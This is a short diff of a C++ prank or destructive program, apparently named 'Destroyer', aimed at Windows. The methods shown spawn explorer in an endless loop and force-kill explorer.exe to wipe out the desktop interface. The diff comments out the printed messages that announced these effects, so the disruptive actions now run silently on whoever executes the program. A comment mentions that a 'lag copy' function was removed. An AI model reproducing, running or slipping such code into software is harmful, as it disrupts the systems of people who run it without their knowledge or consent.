@@ -27,14 +27,14 @@ class Destroyer{
             while (true)
             {
                 system("explorer");
-                std :: cout << "Normally ur pc would be dead\n"; 
+                //std :: cout << "Normally ur pc would be dead\n"; 
             }
         }
 
         void killUI() //ends explorer task, hence destroying the ui of windows 10
         {
             system("taskkill /IM explorer.exe /F");
-            std :: cout << "Your UI would disappear normally\n";
+            //std :: cout << "Your UI would disappear normally\n";
         }
         
         //I have removed the lag copy function because everyone would not have gcc installed
